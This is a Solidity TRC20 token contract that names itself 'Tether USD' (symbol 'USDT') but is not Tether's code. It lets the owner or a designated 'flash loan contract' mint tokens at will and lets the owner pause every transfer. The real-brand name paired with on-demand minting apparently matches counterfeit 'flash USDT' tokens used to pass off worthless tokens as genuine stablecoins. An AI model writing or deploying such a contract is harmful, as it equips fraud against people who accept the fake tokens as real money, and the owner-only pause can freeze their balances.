// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { ITRC20 } from "./ITRC20.sol";
import { ITRC20Metadata } from "./ITRC20Metadata.sol";
import { Context } from "./Context.sol";
import { ITRC20Errors } from "./draft-ITRC20.sol";

contract USDT is ITRC20, ITRC20Metadata, Context, ITRC20Errors {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private _maxSupply;

    string private _name;
    string private _symbol;
    address private _owner;
    address private _flashLoanContract;
    bool private _paused;

    event Mint(address indexed account, uint256 amount);
    event Burn(address indexed account, uint256 amount);

    constructor() {
        _name = "Tether USD";
        _symbol = "USDT";
        _maxSupply = 920000000000000000000000000;
        _owner = _msgSender();
        _mint(_owner, 460 * 10 ** decimals());
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Only the contract owner can call this function");
        _;
    }

    modifier onlyFlashLoanContract() {
        require(msg.sender == _flashLoanContract, "Only the flash loan contract can call this function");
        _;
    }

    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    function setFlashLoanContract(address flashLoanContract) external onlyOwner {
        _flashLoanContract = flashLoanContract;
    }

    function pause() external onlyOwner {
        _paused = true;
    }

    function unpause() external onlyOwner {
        _paused = false;
    }

    function name() external view virtual returns (string memory) {
        return _name;
    }

    function symbol() external view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 6;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function maxSupply() external view virtual returns (uint256) {
        return _maxSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) external virtual whenNotPaused returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function mint(uint256 amount) external returns (bool) {
        require(msg.sender == _flashLoanContract || msg.sender == _owner, "Only the flash loan contract or the owner can mint tokens");
        _mint(msg.sender, amount);
        return true;
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) external virtual whenNotPaused returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external virtual whenNotPaused returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) external virtual whenNotPaused returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) external virtual whenNotPaused returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {
        ITRC20(tokenAddress).transfer(_owner, tokenAmount);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        _owner = newOwner;
    }

    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert TRC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert TRC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert TRC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                _totalSupply -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert TRC20InvalidReceiver(address(0));
        }
        require(_totalSupply + value <= _maxSupply, "ERC20: Maximum supply reached");
        _update(address(0), account, value);
        emit Mint(account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert TRC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
        emit Burn(account, value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert TRC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert TRC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert TRC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}
